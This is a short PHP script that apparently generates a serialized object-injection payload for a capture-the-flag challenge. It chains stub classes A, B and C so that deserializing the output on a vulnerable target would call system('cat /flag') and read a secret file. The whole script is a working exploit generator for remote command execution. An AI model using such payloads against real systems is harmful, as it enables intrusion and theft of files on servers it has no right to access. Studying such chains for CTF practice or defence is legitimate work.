<?php

class A{

}
class B{
}

class C{
}

$c=new C();
$c->evil='system';
$c->arggg='cat /flag';

$b=new B();
$b->cache=array("close"=>array($c,"evallll"));

$a=new A();
$a->data=$b;

echo serialize($a);
